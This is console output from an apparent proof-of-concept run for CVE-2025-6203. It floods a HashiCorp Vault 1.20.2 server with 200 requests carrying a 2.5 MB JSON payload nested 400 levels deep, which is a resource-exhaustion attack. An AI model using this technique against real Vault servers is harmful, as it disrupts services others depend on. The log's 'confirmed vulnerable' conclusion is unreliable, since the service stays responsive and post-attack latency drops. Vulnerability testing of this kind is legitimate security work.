======================================================================
CVE-2025-6203: HashiCorp Vault JSON DoS PoC
======================================================================

[*] Testing Vault service connectivity...
[+] Vault service running (HTTP 200)
    Version: 1.20.2

[*] Enabling audit device (stdout)...
[+] Audit device enabled

[*] Measuring baseline response time...
    Average: 0.0019s

[*] Creating nested JSON payload (depth: 400)...
    Size: 2,598,213 bytes (2.48 MB)

[*] Sending DoS attack (20 workers x 10 = 200 requests)...
    [1/200] HTTP 200 | Duration: 3.53s
    [21/200] HTTP 200 | Duration: 5.03s
    [41/200] HTTP 204 | Duration: 4.84s
    [61/200] HTTP 200 | Duration: 4.77s
    [81/200] HTTP 204 | Duration: 4.46s
    [101/200] HTTP 200 | Duration: 4.98s
    [121/200] HTTP 204 | Duration: 4.93s
    [141/200] HTTP 200 | Duration: 5.12s
    [161/200] HTTP 204 | Duration: 4.94s
    [181/200] HTTP 200 | Duration: 4.54s

[*] Checking service status...
    Service responding (time: 0.001s)

[*] Measuring post-attack response time...
    Average: 0.0011s (change: -42.6%)

======================================================================
Attack Statistics:
    Total: 200, Timeouts: 0, Conn Errors: 0
    Slow (>3s): 200, Avg Duration: 4.82s
    Attack Duration: 49.27s
======================================================================

[+] VULNERABLE! CVE-2025-6203 confirmed

Evidence:
  - 200 slow responses (>100%)
  - High avg request duration: 4.82s

Conclusion:
  Vault 1.20.2 lacks JSON complexity limits
  Complex payloads cause resource exhaustion
